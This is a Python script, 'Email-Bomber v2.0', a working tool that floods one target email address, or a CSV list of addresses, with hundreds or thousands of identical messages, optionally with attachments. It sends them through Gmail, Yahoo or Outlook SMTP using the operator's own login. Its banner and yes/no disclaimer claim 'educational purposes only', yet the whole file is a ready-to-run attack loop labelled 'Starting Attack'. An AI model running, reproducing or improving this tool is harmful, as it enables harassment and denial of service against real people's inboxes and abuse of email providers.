import smtplib
import sys
import time
import logging
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import csv




class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v2.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ Ethical Use Only ]+]+]+')
    print(bcolors.GREEN + '"This script is for educational purposes only."')
    print(bcolors.GREEN + '''
                     \|/
                       --+--'
                          |
                      ,--'#--.
                      |#######|
                   _.-'#######-._
                ,-'###############-.
              ,'#####################,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: ROTATOR12
           |#############################|
            |###########################|
             \#########################/
              .#####################,'
                ._###############_,'
                   --..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    --' ''')




def disclaimer():
    print(bcolors.RED + "\nThis script is for educational purposes only. Unauthorized use is prohibited.")
    consent = input(bcolors.YELLOW + "Do you agree to use this ethically? (yes/no): ")
    if consent.lower() != 'yes':
        print("Exiting program.")
        sys.exit(0)


class EmailBomber:
    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = input(bcolors.GREEN + 'Enter target email <: ')
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if self.mode > 4 or self.mode < 1:
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = input(bcolors.GREEN + 'Enter email server | 1:Gmail 2:Yahoo 3:Outlook <: ')
            premade = {'1': 'smtp.gmail.com', '2': 'smtp.mail.yahoo.com', '3': 'smtp-mail.outlook.com'}
            self.server = premade.get(self.server, self.server)

            if self.server not in premade.values():
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
            else:
                self.port = 587

            self.fromAddr = input(bcolors.GREEN + 'Enter your email address <: ')
            self.fromPwd = getpass.getpass(bcolors.GREEN + 'Enter your email password <: ')
            self.subject = input(bcolors.GREEN + 'Enter subject <: ')
            self.message = input(bcolors.GREEN + 'Enter message <: ')

            # Optional: Attachments
            attach_option = input(bcolors.YELLOW + 'Do you want to add an attachment? (yes/no): ')
            if attach_option.lower() == 'yes':
                filename = input(bcolors.GREEN + 'Enter the file path to attach: ')
                self.attachment = filename
            else:
                self.attachment = None

            self.msg = MIMEMultipart()
            self.msg['From'] = self.fromAddr
            self.msg['To'] = self.target
            self.msg['Subject'] = self.subject
            self.msg.attach(MIMEText(self.message, 'plain'))

            if self.attachment:
                part = MIMEBase('application', 'octet-stream')
                with open(self.attachment, 'rb') as file:
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={self.attachment}")
                self.msg.attach(part)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send_email(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg.as_string())
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def start_attack(self):
        print(bcolors.RED + '\n+[+[+[ Starting Attack... ]+]+]+')
        self.count = 0
        for _ in range(self.amount):
            self.send_email()
            time.sleep(1)  # Rate limiting: 1 second delay between emails
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')


if __name__ == '__main__':
    banner()
    disclaimer()

    bomber = EmailBomber()
    bomber.setup_bomb()
    bomber.setup_email()

    # Optional Multi-target support
    multi_target = input(bcolors.YELLOW + 'Do you want to send emails to multiple targets from a CSV file? (yes/no): ')
    if multi_target.lower() == 'yes':
        csv_file = input(bcolors.GREEN + 'Enter the CSV file path: ')
        try:
            with open(csv_file, 'r') as file:
                reader = csv.reader(file)
                for row in reader:
                    bomber.target = row[0]
                    print(bcolors.YELLOW + f'Sending email to {bomber.target}')
                    bomber.start_attack()
        except Exception as e:
            print(f'ERROR: {e}')
    else:
        bomber.start_attack()
